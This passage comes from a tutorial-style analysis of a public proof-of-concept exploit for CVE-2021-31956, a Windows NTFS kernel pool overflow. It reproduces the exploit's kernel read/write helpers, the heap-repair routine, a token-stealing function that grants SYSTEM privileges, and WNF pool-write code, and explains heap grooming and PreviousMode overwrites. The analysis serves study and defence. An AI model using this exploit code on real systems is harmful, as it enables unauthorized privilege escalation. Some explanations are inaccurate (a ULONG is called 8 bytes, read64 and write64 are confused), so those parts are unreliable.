<p>The EPROCESS structure is an opaque structure that serves as the process object for a process.</p>
</blockquote>
<p>In layman's terms, this basically means that if an attacker obtains the <code>EPROCESS</code> memory address for their current process, if they had a kernel-mode write primitive, they would be able to escalate their privileges to <code>SYSTEM</code>. The specifics of this technique is described in the next section.</p>
<h3 id="previousmode-overwrite"><a class="header" href="#previousmode-overwrite">PreviousMode Overwrite</a></h3>
<p>As noted by Kaspersky, traditionally, an attacker would steal the <code>SYSTEM</code> token to escalate privileges. However, by overwriting the <code>PreviousMode</code> field with <code>0x0</code>, it is possible to then execute various routines from user-made in kernel-mode. This means that with the <code>PreviousMode</code> field set to <code>0x0</code>, parameters are trusted and thus are not checked by the kernel.</p>
<p>Now that we have a basic grasp of the context of what CVE-2021-31956 does and how it was discovered, let's now explore the proof-of-concept used to exploit this vulnerability.</p>
<h2 id="exploitation-overview"><a class="header" href="#exploitation-overview">Exploitation Overview</a></h2>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>In order to arbitrarily read and write to anywhere in memory, we will need to first groom the heap until our NTFS buffer is next to a <code>_WNF_STATE_DATA</code> chunk. Then, we will need to overflow the <code>AllocatedSize</code> and <code>DataSize</code> fields within the <code>_WNF_STATE_DATA</code> chunk. The <code>AllocatedSize</code> and <code>DataSize</code> fields now provide us with the ability to read and write within the pool after this chunk. Specifically, <code>AllocatedSize</code> determines the number of bytes that can be written whereas <code>DataSize</code> determines the number of bytes that can be read. Using this read and write ability, we will then locate a <code>_WNF_NAME_INSTANCE</code> chunk and read it's <code>StateName</code> to . In addition, we will use our write to overwrite the <code>StateData</code> parameter in the <code>_WNF_NAME_INSTANCE</code> chunk to point anywhere in memory, so long as the location in memory has a <code>_WNF_STATE_DATA</code> structure.</p>
<p><img src="img/Overview.png" alt="" /></p>
<h2 id="examining-y3as-proof-of-concept"><a class="header" href="#examining-y3as-proof-of-concept">Examining Y3A's Proof-of-Concept</a></h2>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>In this section we will be looking at the approach <a href="https://y3a.github.io/">Y3A</a> took to exploit CVE-2021-31956. Our goal is to break down every section and understand exactly why the exploit works and the concepts behind each technique used.</p>
<h3 id="include-directives"><a class="header" href="#include-directives">Include Directives</a></h3>
<p>Now that we understand the context in which the vulnerability was originally used, let's explore the proof-of-concept <a href="https://github.com/Y3A">Y3A</a> of Star Labs created to exploit CVE-2021-31956.</p>
<p>To start things off, we will examine the import section of the
proof-of-concept. As with most C++ source code, the first section is
usually a series of <code>#include</code> directives:</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;ntstatus.h&gt;
#include &lt;TlHelp32.h&gt;
#include "CVE-2021-31956.h"
</code></pre>
<p>As defined by <a href="https://learn.microsoft.com/en-us/cpp/preprocessor/hash-include-directive-c-cpp?view=msvc-170">Microsoft</a>, the <code>#include</code>
directive informs the C++ preprocessor to add the contents of the
specified file at the location of the <code>#include</code> directive in the source
code.</p>
<p>Looking at the above code block, we notice the first four <code>#include</code>
directives use angle bracket notation whereas the last <code>#include</code>
directive uses the quotation notation to describe the target header
file. According to the <a href="https://gcc.gnu.org/onlinedocs/cpp/Include-Syntax.html">GNU Foundation</a>, angle brackets
or <code>#include &lt;file&gt;</code> are used to specify system header files. However,
double quotation marks or <code>#include "file"</code> are used to define a
user-generated header file. The search location for angle bracket
<code>#include</code> directives is within a standard list of system directories
whereas for double quotation mark <code>#include</code> directives the search
location is within the directory of the source code.</p>
<h3 id="null-pointer-declarations"><a class="header" href="#null-pointer-declarations">NULL-Pointer Declarations</a></h3>
<p>Moving on, we now examine the NULL-pointer declaration and type-casting
used prior to the <code>main</code> function:</p>
<pre><code class="language-cpp">NQSI _NtQuerySystemInformation = (NQSI)NULL;
NQEF _NtQueryEaFile = (NQEF)NULL;
NSEF _NtSetEaFile = (NSEF)NULL;
NCWSN _NtCreateWnfStateName = (NCWSN)NULL;
NUWSD _NtUpdateWnfStateData = (NUWSD)NULL;
NDWSN _NtDeleteWnfStateName = (NDWSN)NULL;
NDWSD _NtDeleteWnfStateData = (NDWSD)NULL;
NQWSD _NtQueryWnfStateData = (NQWSD)NULL;
NRVM _NtReadVirtualMemory = (NRVM)NULL;
NWVM _NtWriteVirtualMemory = (NWVM)NULL;
</code></pre>
<p>In order to effectively break each line down, we will also pair each
NULL-pointer declaration and type-casting to its respective type
definition found in the <code>CVE-2021-31956.h</code> header file. To start things
off, let's look at the first line:</p>
<pre><code class="language-cpp">NQSI _NtQuerySystemInformation = (NQSI)NULL;
</code></pre>
<p>Here, we see that the variable <code>_NtQuerySystemInformation</code> is of type
<code>NQSI</code> with the same type being type-cast to the value <code>NULL</code>. According
to <a href="http://www.cs.ecu.edu/karl/3300/spr14/Notes/C/typedef.html">East Carolina University</a>, it is possible to use
<code>typedef</code> to give a function type a name. For example,</p>
<pre><code class="language-cpp">typedef NTSTATUS(NTAPI *NQSI) (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
</code></pre>
<p>Would define the function pointer <code>NQSI</code> of type <code>NTAPI</code> to be the type
of the function that takes 4 arguments and returns an <code>NTSTATUS</code> value.
Without loss of generality, it is possible to use this same approach to
the other NULL-pointer declarations and type-castings.</p>
<h3 id="the-write64-function"><a class="header" href="#the-write64-function">The write64 Function</a></h3>
<p>Looking at the <code>write64</code> function declaration, namely:</p>
<pre><code class="language-cpp">void write64(ULONG_PTR addr, UINT64 data)
</code></pre>
<p>We notice it has a return value of <code>void</code> indicating that it does not
return a value. In addition, we see that it takes a Unsigned Long
pointer and a Unsigned 64-bit integer as input. Examining the function
definition we see the following:</p>
<pre><code class="language-cpp">char    buf[8] = { 0 };
ULONG   wrote;

*(UINT64 *)buf = data;
_NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &amp;wrote);

return;
</code></pre>
<p>First, a <code>char</code> array called <code>buf</code> and of size <code>8</code> with its elements
initialized to <code>0</code>. We also notice the variable <code>wrote</code> is declared of
type <code>ULONG</code>. According to <a href="https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/ulong-data-type">Microsoft</a>, a <code>ULong</code>
data type contains an <code>8</code>-byte unsigned integer. Next, we see the
pointer <code>buf</code> being cast to a pointer of type <code>UINT64</code> before being
dereferenced and given the value of <code>data</code>. As such, the datatype of the
content pointed to by <code>buf</code> will now be interpreted as a <code>UINT64</code>, in this
case as a 64-bit unsigned integer.</p>
<p>Before examining the final line, let's look at the type definition for
the <code>NWVM</code> datatype:</p>
<pre><code class="language-cpp">typedef NTSTATUS (NTAPI *NWVM)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);
</code></pre>
<p>We are looking at the type definition for <code>NWVM</code> as a function prototype
for <code>_NtWriteVirtualMemory</code> does not exist in this file and it seems
what the author did was use the NULL-pointer declaration and
type-casting</p>
<pre><code class="language-cpp">NWVM _NtWriteVirtualMemory = (NWVM)NULL;
</code></pre>
<p>To create a NULL-pointer named <code>_NtWriteVirtualMemory</code> of type <code>NWVM</code>
where they then called this pointer in the third to final line in
<code>write64</code>:</p>
<pre><code class="language-cpp">_NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &amp;wrote);
</code></pre>
<p>As we can see from the <code>NWVM</code> datatype type definition, we have the
following observations:</p>
<ul>
<li>The returned handle from <code>GetCurrentProcess()</code> is passed as <code>ProcessHandle</code>.</li>
<li>The void pointer <code>addr</code> provided as the first input value is passed as <code>BaseAddress</code>.</li>
<li>The Unsigned 64-bit integer pointer <code>buf</code> is passed as <code>Buffer</code> which has the void pointer datatype.</li>
<li>The hexadecimal value <code>0x8</code> is passed as the Unsigned Long <code>NumberOfBytesToWrite</code>.</li>
<li>The memory address <code>&amp;wrote</code> is passed as the output buffer <code>NumberOfBytesWritten</code>.</li>
</ul>
<p>Interestingly enough, since <code>_NtWriteVirtualMemory</code> was not called as a
function, but rather as a pointer to a structure, the return value is
not assigned to a variable within the function. Instead after calling
<code>_NtWriteVirtualMemory</code>, the function simply returns with no return
value.</p>
<p>Based on our analysis, we can conclude that the purpose of this function is to call <code>NtWriteVirtualMemory</code> and subsequently write the content <code>buf</code> at the location <code>addr</code>.</p>
<h3 id="the-read64-function"><a class="header" href="#the-read64-function">The read64 Function</a></h3>
<p>Looking at the <code>read64</code> function declaration, we see that it accepts a
Unsigned Long pointer called <code>addr</code> as input and returns a Unsigned
64-bit integer:</p>
<pre><code>UINT64 read64(ULONG_PTR addr)
</code></pre>
<p>Next, as with the <code>write64</code> function, we notice that a <code>char</code> array and
a Unsigned Long value are declared with the <code>buf</code> character array being
initialized to <code>0</code>:</p>
<pre><code class="language-cpp">char    buf[8] = { 0 };
ULONG   read;
</code></pre>
<p>Before examining the NULL-pointer function call, let's look at the pointer type definition for <code>NRVM</code>:</p>
<pre><code class="language-cpp">typedef NTSTATUS (NTAPI *NRVM)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesReaded OPTIONAL
);
</code></pre>
<p>Here, we see a similar structure to that of <code>_NtWriteVirtualMemory</code>. As such, we won't go into as much detail except to break down the values passed from <code>writ64</code> to the NULL-pointer function call:</p>
<pre><code class="language-cpp">_NtReadVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &amp;read);
</code></pre>
<p>We can see the following:</p>
<ul>
<li>The <code>HANDLE</code> from <code>GetCurrentProcess()</code> is passed as <code>ProcessHandle</code>.</li>
<li>The <code>addr</code> provided as input to <code>write64</code> function is passed as the <code>BaseAddress</code>.</li>
<li>The initialized buffer <code>buf</code> is then passed as the output buffer <code>Buffer</code>.</li>
<li>The value <code>0x8</code> is passed as the <code>NumberOfBytesToRead</code>.</li>
<li>The address to the Unsigned Long value <code>read</code> is passed as <code>&amp;read</code>.</li>
</ul>
<p>Finally, the <code>write64</code> function returns a pointer to the Unsigned 64-bit integer output buffer <code>buf</code>:</p>
<pre><code class="language-cpp">return *(UINT64 *)buf;
</code></pre>
<p>In conclusion, our analysis shows that the purpose of this function is call <code>NtReadVirtualMemory</code> and return the contents <code>buf</code> from the address <code>addr</code>.</p>
<h3 id="the-fix_runrefs-function"><a class="header" href="#the-fix_runrefs-function">The fix_runrefs Function</a></h3>
<p>Reviewing the <a href="https://y3a.github.io/2022/09/03/cve-2021-31956/">blog post by Y3A</a>, we see that the <code>fix_runrefs</code> function is used to clean up the heap after exploiting CVE-2021-31956.</p>
<p>Reviewing the exploitation process covered in <a href="#exploitation-overview">Exploitation Overview</a>, We notice that in order to overwrite the target <code>StateData</code> pointer, the preceding members in the <code>_WNF_NAME_INSTANCE</code> data structure may also be overwritten. Reviewing the <code>_WNF_NAME_INSTANCE</code> data structure from the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_WNF_NAME_INSTANCE">Vergilius Project</a>, we see the following:</p>
<pre><code class="language-cpp">//0xa8 bytes (sizeof)
struct _WNF_NAME_INSTANCE
{
    struct _WNF_NODE_HEADER Header;                                         //0x0
    struct _EX_RUNDOWN_REF RunRef;                                          //0x8
    struct _RTL_BALANCED_NODE TreeLinks;                                    //0x10
    struct _WNF_STATE_NAME_STRUCT StateName;                                //0x28
    struct _WNF_SCOPE_INSTANCE* ScopeInstance;                              //0x30
    struct _WNF_STATE_NAME_REGISTRATION StateNameInfo;                      //0x38
    struct _WNF_LOCK StateDataLock;                                         //0x50
    struct _WNF_STATE_DATA* StateData;                                      //0x58
    ULONG CurrentChangeStamp;                                               //0x60
    VOID* PermanentDataStore;                                               //0x68
    struct _WNF_LOCK StateSubscriptionListLock;                             //0x70
    struct _LIST_ENTRY StateSubscriptionListHead;                           //0x78
    struct _LIST_ENTRY TemporaryNameListEntry;                              //0x88
    struct _EPROCESS* CreatorProcess;                                       //0x98
    LONG DataSubscribersCount;                                              //0xa0
    LONG CurrentDeliveryCount;                                              //0xa4
}; 
</code></pre>
<p>As we can see, the <code>RunRef</code> member is located at an offset lower than that of <code>StateData</code>. As a result, it is possible for the <code>RunRef</code> member to be set to an invalid value during the exploitation process. If this is the case, the target system may crash and result in a Blue Screen of Death (BSOD). In order to prevent this from happening, the <code>fix_runrefs</code> function locates all affected <code>_WNF_NAME_INSTANCE</code> in memory by traversing the <code>WnfContext</code> field within our process's <code>_EPROCESS</code>. Once a <code>_WNF_NAME_INSTANCE</code> block is found, the <code>RunRef</code> member is set to <code>0</code>. This is done since the <code>RunRef</code> member is a reference counter and by setting it to zero, we can avoid any issues if the system ever tries to use the this field.</p>
<p>Examining the function declaration for <code>fix_runrefs</code>, we see the following:</p>
<pre><code class="language-cpp">NTSTATUS fix_runrefs(_In_ PWNF_PROCESS_CONTEXT ctx)
</code></pre>
<p>The first thing we notice the <a href="https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2012/hh916383(v=vs.110)?redirectedfrom=MSDN">SAL Annotation</a> <code>_In_</code>. SAL Annotation, or Source-code Annotation Language, is defined by Microsoft as:</p>
<blockquote>
<p>A set of annotations that you can use to describe how a function uses its parameters, the assumptions that it makes about them, and the guarantees that it makes when it finishes. Visual Studio code analysis for C++ uses SAL annotations to modify its analysis of functions. [...] Simply stated, SAL is an inexpensive way to let the compiler check your code for you.</p>
</blockquote>
<p>According to Microsoft, <code>_In_</code> or Input to called function, is used as a way to label data as:</p>
<blockquote>
<p>Being passed to the called function, and is treated as read-only.</p>
</blockquote>
<p>Next, we examine the pointer declaration for <code>PWNF_PROCESS_CONTEXT</code>:</p>
<pre><code class="language-cpp">typedef struct _WNF_PROCESS_CONTEXT
{
    struct _WNF_NODE_HEADER Header;                                         //0x0
    struct _EPROCESS *Process;                                              //0x8
    struct _LIST_ENTRY WnfProcessesListEntry;                               //0x10
    VOID *ImplicitScopeInstances[3];                                        //0x20
    struct _WNF_LOCK TemporaryNamesListLock;                                //0x38
    struct _LIST_ENTRY TemporaryNamesListHead;                              //0x40
    struct _WNF_LOCK ProcessSubscriptionListLock;                           //0x50
    struct _LIST_ENTRY ProcessSubscriptionListHead;                         //0x58
    struct _WNF_LOCK DeliveryPendingListLock;                               //0x68
    struct _LIST_ENTRY DeliveryPendingListHead;                             //0x70
    struct _KEVENT *NotificationEvent;                                      //0x80
} WNF_PROCESS_CONTEXT, *PWNF_PROCESS_CONTEXT;
</code></pre>
<p>We now know that the value <code>ctx</code> is a pointer to a <code>_WNF_PROCESS_CONTEXT</code> structure and is treated as read-only. Now that we have an understanding of the function declaration, let's move onto the function definition for <code>fix_runrefs</code>. In particular, let's first examine the first variable definition:</p>
<pre><code class="language-cpp">NTSTATUS            status = STATUS_SUCCESS;
</code></pre>
<p>As shown above, we have a variable <code>status</code> of type <code>NTSTATUS</code> that contains the value <code>0x00000000</code> otherwise known as <code>STATUS_SUCCESS</code>. Interestingly enough, this value seemingly does not change and will always return <code>STATUS_SUCCESS</code> at the end of the function. Let's move onto the <code>head</code> variable:</p>
<pre><code class="language-cpp">PLIST_ENTRY         head = (PLIST_ENTRY)read64(&amp;(ctx-&gt;TemporaryNamesListHead));
</code></pre>
<p>The next variable is <code>head</code>, of type <code>PLIST_ENTRY</code>, and is set to the <code>TemporaryNamesListHead</code> member of the <code>_WNF_PROCESS_CONTEXT</code> structure pointed to by <code>ctx</code>. Let's take a moment to further break apart this variable definition. First, let's use the prototype provided by <a href="https://www.nirsoft.net/kernel_struct/vista/LIST_ENTRY.html">NirSoft</a> to examine the data structure that <code>PLIST_ENTRY</code> points to:</p>
<pre><code class="language-cpp">typedef struct _LIST_ENTRY
{
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
} LIST_ENTRY, *PLIST_ENTRY;
</code></pre>
<p>As we can see, <code>PLIST_ENTRY</code> points to a <code>_LIST_ENTRY</code> structure. In our case, this structure is located at the memory address found in the <code>TemporaryNamesListHead</code> member of the <code>ctx</code> pointer. Examining the <code>_WNF_PROCESS_CONTEXT</code> structure from the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_WNF_PROCESS_CONTEXT">Vergilius Project</a>, we see the following:</p>
<pre><code class="language-cpp">//0x88 bytes (sizeof)
struct _WNF_PROCESS_CONTEXT
{
    struct _WNF_NODE_HEADER Header;                                         //0x0
    struct _EPROCESS* Process;                                              //0x8
    struct _LIST_ENTRY WnfProcessesListEntry;                               //0x10
    VOID* ImplicitScopeInstances[3];                                        //0x20
    struct _WNF_LOCK TemporaryNamesListLock;                                //0x38
    struct _LIST_ENTRY TemporaryNamesListHead;                              //0x40
    struct _WNF_LOCK ProcessSubscriptionListLock;                           //0x50
    struct _LIST_ENTRY ProcessSubscriptionListHead;                         //0x58
    struct _WNF_LOCK DeliveryPendingListLock;                               //0x68
    struct _LIST_ENTRY DeliveryPendingListHead;                             //0x70
    struct _KEVENT* NotificationEvent;                                      //0x80
}; 
</code></pre>
<p>The <code>TemporaryNamesListHead</code> is of type <code>_LIST_ENTRY</code> and based on the <code>_LIST_ENTRY</code> function prototype, we can assume that this value always points to the next <code>_WNF_NAME_INSTANCE</code> unless it is the last <code>_WNF_NAME_INSTANCE</code> data structure. In that case, the last <code>_WNF_NAME_INSTANCE</code> data structure would contain the same address in both the <code>head</code> and <code>next</code> variables. As briefly discussed, the <code>next</code> variable simply points to the address stored in the <code>head</code> variable. This is shown below:</p>
<pre><code class="language-cpp">PLIST_ENTRY         next = read64(head);
</code></pre>
<p>Finally, the last variable definition in the <code>fix_runrefs</code> is below:</p>
<pre><code class="language-cpp">PWNF_NAME_INSTANCE  cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry);
</code></pre>
<p>Here, we see that a variable called <code>cur</code> is a pointer to a <code>_WNF_NAME_INSTANCE</code> structure that contains the data structure pointed to by <code>TemporaryNameListEntry</code>. Based on the context of it's use, we can see that the pointer <code>cur</code> is used as a way to modify the <code>RunRef</code> member of any corrupted <code>_WNF_NAME_INSTANCE</code> data structures. We see this in action below:</p>
<pre><code class="language-cpp">for (; next != head; next = read64(next), cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry))
    
    if ((UINT64)read64(&amp;(cur-&gt;Header)) != (UINT64)0x0000000000A80903) {
        write64(&amp;(cur-&gt;Header), (UINT64)0x0000000000A80903);
        write64(&amp;(cur-&gt;RunRef), (UINT64)0x0000000000000000);
    }
</code></pre>
<p>As shown above, each <code>_WNF_NAME_INSTANCE</code> data structure is iteratively pointed to by <code>cur</code> and the <code>Header</code> member is read. If the <code>Header</code> member is not equal to the sane value <code>0x0000000000A80903</code>, we then change both the <code>Header</code> member and the <code>RunRef</code> member to the sane values <code>0x0000000000A80903</code> and <code>0x0000000000000000</code>, respectively.</p>
<p>Finally, the <code>fix_runrefs</code> function outputs an update to the screen and returns the previously defined <code>status</code>:</p>
<pre><code class="language-cpp">puts("[+] Fixed all overwritten header and runrefs");

return status;
</code></pre>
<h3 id="the-steal_token-function"><a class="header" href="#the-steal_token-function">The steal_token Function</a></h3>
<p>According to <a href="https://attack.mitre.org/techniques/T1134/">MITRE</a>, Token Stealing is defined as follows:</p>
<blockquote>
<p>Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.</p>
</blockquote>
<p>With this knowledge, <a href="https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation">Mantvydas Baranauskas</a> provides a high-level overview of how Token Stealing is generally carried out:</p>
<blockquote>
<ol>
<li>Open a process with access token you want to steal</li>
<li>Get a handle to the access token of that process</li>
<li>Make a duplicate of the access token present in that process</li>
<li>Create a new process with the newly acquired access token</li>
</ol>
</blockquote>
<p>Now that we know the general process attackers use in Token Stealing, we can adapt that methodology to how the <code>steal_token</code> function works. To start things off, let's first examine the <code>steal_token</code> function declaration:</p>
<pre><code class="language-cpp">NTSTATUS steal_token(_In_ PEPROCESS own_eproc)
</code></pre>
<p>We see that the <code>steal_token</code> function takes a single read-only EPROCESS pointer called <code>own_eproc</code> and returns an <code>NTSTATUS</code> value. We know that <code>own_eproc</code> is a pointer to an <code>EPROCESS</code> structure since the standard naming convention for pointer variables usually entails the following components:</p>
<ul>
<li>A <code>P</code> preceding a structure name.</li>
<li>The type being in all capital letters.</li>
</ul>
<p>Moving on, we will now examine the first variable definition:</p>
<pre><code class="language-cpp">NTSTATUS            status = STATUS_UNSUCCESSFUL;
</code></pre>
<p>The first variable, <code>status</code> is of type <code>NTSTATUS</code> and is initially set to the <code>STATUS_UNSUCCESSFUL</code> value <code>0xC0000001</code>. However, if the <code>steal_token</code> function locates the SYSTEM process (<code>0x4</code>), the <code>status</code> value will be set to <code>STATUS_SUCCESS</code>. The following variable defined, <code>next</code> is shown below:</p>
<pre><code class="language-cpp">PLIST_ENTRY         next = (PLIST_ENTRY)read64(&amp;(own_eproc-&gt;ActiveProcessLinks));
</code></pre>
<p>The <code>next</code> variable is a pointer to a <code>_LIST_ENTRY</code> structure which contains the <code>_LIST_ENTRY</code> data structure stored in the <code>ActiveProcessLinks</code> member of the <code>own_eproc</code> input pointer. This is important as <code>ActiveProcessLinks</code> can be used recursively to obtain the memory address of the next EPROCESS data structure in memory.</p>
<pre><code class="language-cpp">PEPROCESS           cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);
</code></pre>
<p>Our next variable, <code>cur</code> is a pointer to an EPROCESS structure. According to <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record">Microsoft</a>:</p>
<blockquote>
<p>The <code>CONTAINING_RECORD</code> macro returns the base address of an instance of a structure given the type of the structure and the address of a field within the containing structure.</p>
</blockquote>
<p>The <code>CONTAINING_RECORD</code> macro prototype is:</p>
<pre><code class="language-cpp">void CONTAINING_RECORD(
   address,
   type,
   field
);
</code></pre>
<p>Thus, the <code>cur</code> variable is a pointer to an EPROCESS structure that contains the <code>next</code> address pointing to the <code>ActiveProcessLinks</code> field. Within the <code>CVE-2021-31956.h</code> header file, we see that both <code>EPROCESS</code> and <code>ActiveProcessLinks</code> are defined as part of an abridged version of <code>_EPROCESS</code>:</p>
<pre><code class="language-cpp">typedef struct
{
    char padding1[0x440];
    UINT64 UniqueProcessId;
    LIST_ENTRY ActiveProcessLinks;
    char padding2[0x60];
    EX_FAST_REF Token;
    char padding3[0x3a8];
    PWNF_PROCESS_CONTEXT WnfContext;
} EPROCESS, *PEPROCESS;
</code></pre>
<p>Here, we see that the <code>typedef</code> is not overwriting the <code>_EPROCESS</code> function prototype. Rather, it is simply creating a skeleton to be assigned as <code>EPROCESS</code> and by <code>PEPROCESS</code>. Now that we have defined all variable assignments within the <code>steal_token</code> function, we will now proceed onto the main <code>for</code> loop:</p>
<pre><code class="language-cpp">for (; cur != own_eproc; next = (PLIST_ENTRY)read64(next), cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks))
    if ((UINT64)read64(&amp;(cur-&gt;UniqueProcessId)) == (UINT64)0x4) {
        write64(&amp;(own_eproc-&gt;Token), read64(&amp;(cur-&gt;Token)));
        status = STATUS_SUCCESS;
        puts("[+] Stole system token!");
        goto out;
    }
</code></pre>
<p>Since the <code>ActiveProcessLinks</code> structure is a circular doubly-linked list, the <code>for</code> loop will terminate if the current EPROCESS is equal to our own EPROCESS. So long as this is not the case, the <code>next</code> variable is set to point to the <code>cur</code> EPROCESS' <code>ActiveProcessLinks</code> address. Then, the <code>cur</code> EPROCESS is updated to the EPROCESS pointed to by the <code>next</code> variable. This in-turn allows the <code>for</code> loop to execute the <code>if</code> condition on every EPROCESS in memory.</p>
<p>The <code>UniqueProcessId</code> for the SYSTEM EPROCESS is equal to <code>0x4</code>. Therefore, the <code>if</code> condition checks if the <code>cur</code> EPROCESS has a <code>UniqueProcessId</code> of <code>0x4</code>. If so, the <code>Token</code> member of the <code>own_eproc</code> EPROCESS, which is our own EPROCESS, will be overwritten with the <code>Token</code> member of the <code>cur</code> EPROCESS. The <code>status</code> value will then set to <code>STATUS_SUCCESS</code> and the <code>for</code> loop will break via the <code>goto out</code> statement.</p>
<p>If there is no EPROCESS that has a <code>UniqueProcessId</code> of <code>0x4</code>, a <code>log_warn</code> message will be issued and the <code>STATUS_UNSUCCESSFUL</code> status will be returned. However, if the <code>goto out</code> statement is executed, the program will skip the <code>log_warn</code> line and proceed to the <code>out:</code> section of code and return the <code>STATUS_SUCCESS</code> value:</p>
<pre><code class="language-cpp">    log_warn("Unable to find system process token");

out:
    return status;
</code></pre>
<h3 id="the-write_pool-function"><a class="header" href="#the-write_pool-function">The write_pool Function</a></h3>
<p>To start things off, let's go back to Alex Plaskett's <a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">blog post</a> and review the work already done in reversing the functionality used to write controlled pool allocations. First off, as we recall, the <code>AllocatedSize</code> and <code>DataSize</code> members of the <code>_WNF_STATE_DATA</code> structure are excellent read/write primitives for any pool allocations made after the corrupted <code>_WNF_STATE_DATA</code> structure:</p>
<pre><code class="language-cpp">struct _WNF_STATE_DATA
{
    struct _WNF_NODE_HEADER Header;                                         //0x0
    ULONG AllocatedSize;                                                    //0x4
    ULONG DataSize;                                                         //0x8
    ULONG ChangeStamp;                                                      //0xc
}; 
</code></pre>
<p>Now, there exists a user-mode accessible function call named <code>NtUpdateWnfStateData</code> that can allocate a <code>_WNF_STATE_DATA</code> chunk in the pool. This is done to conduct a heap spray in order to increase the likelihood that the vulnerable NTFS buffer is place right before a <code>_WNF_STATE_DATA</code> buffer in memory. With the theory out of the way, let's take a look at the function declaration for <code>write_pool</code>:</p>
<pre><code class="language-cpp">NTSTATUS write_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _In_ char *buf, _In_ ULONG buf_sz)
</code></pre>
<p>We see that <code>write_pool</code> returns an <code>NTSTATUS</code> value and takes 4 parameters:</p>
<ul>
<li><code>statenames</code>: A read-only pointer to a <code>WNF_STATE_NAME</code> structure. However, based on the usage by the <code>main</code> function, <code>statenames</code> is a collection of <code>WNF_STATE_NAME</code> structures where the index <code>idx</code> points to a specific <code>WNF_STATE_NAME</code> structure.</li>
<li><code>idx</code>: A read-only unsigned long value.</li>
<li><code>buf</code>: A read-only pointer to a character buffer.</li>
<li><code>buf_sz</code>: A read-only unsigned long value.</li>
</ul>
<p>Before continuing, it's important to note that the <code>WNF_STATE_NAME</code> structure is the target for our read primitive, as with access to the <code>WNF_STATE_NAME</code> structure, we can get a pointer to the <code>WNF_STATE_DATA</code> buffer which would then allow us to write anywhere in memory.</p>
<p>Let's proceed to the variable initializations:</p>
<pre><code class="language-cpp">NTSTATUS                status = STATUS_SUCCESS;
UINT64                  name = 0;
</code></pre>
<p>Let's now define each variable's purpose within <code>write_pool</code>:</p>
<ul>
<li><code>status</code> is initialized to the value <code>STATUS_SUCCESS</code> and is of type <code>NTSTATUS</code>.</li>
<li><code>name</code> is a unsigned 64-bit integer initialized to the value <code>0</code>.</li>
</ul>
<p>Now that the two variables <code>status</code> and <code>name</code> are initialized, let's proceed to examine how they are updated:</p>
<pre><code class="language-cpp">name = (UINT64)(*(UINT64 *)(statenames[idx].Data));
status = _NtUpdateWnfStateData((PCWNF_STATE_NAME)&amp;name, buf, buf_sz, NULL, NULL, 0, 0);
</code></pre>
<p>We see the following:</p>
<ul>
<li><code>name</code> is set to the <code>Data</code> field of the <code>_WNF_STATE_NAME</code> at the index <code>idx</code>.</li>
<li><code>status</code> is set to the <code>NTSTATUS</code> returned by the <code>_NtUpdateWnfStateData</code> function call.</li>
</ul>
<p>Let's further examine the <code>_NtUpdateWnfStateData</code> function call. First, we recall the following NULL pointer declaration:</p>
<pre><code class="language-cpp">NUWSD _NtUpdateWnfStateData = (NUWSD)NULL;
</code></pre>
<p>As <code>_NtUpdateWnfStateData</code> uses a custom datatype, let's look the custom datatype's prototype:</p>
<pre><code class="language-cpp">typedef NTSTATUS(NTAPI *NUWSD)(
    _In_ PWNF_STATE_NAME StateName,
    _In_reads_bytes_opt_(Length) const VOID *Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const PVOID ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ ULONG CheckStamp
    );
</code></pre>
<p>We notice the similarity to the function prototype of <code>NtUpdateWnfStateData</code>:</p>
<pre><code class="language-cpp">NTSTATUS
NTAPI
NtUpdateWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_reads_bytes_opt_(Length) const VOID* Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const PVOID ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp
    );
</code></pre>
<p>However, in the case of the custom datatype, it appears to simply be used as a means to set up a datatype to then be resolved by <code>GetProcAddress</code>. Due to ASLR/kASLR, it is no longer realistic to predict the base address of a function. Therefore, by simply creating a NULL pointer definition, we can define the structure prior to finding the function in memory.</p>
<p>Let's now proceed to the <code>return</code> conditions:</p>
<pre><code class="language-cpp">if (!NT_SUCCESS(status)) {
    log_warn("write_pool::_NtUpdateWnfStateData()1");
    goto out;
}

puts("[+] Successfully updated adjacent WNF_NAME_INSTANCE");

out:
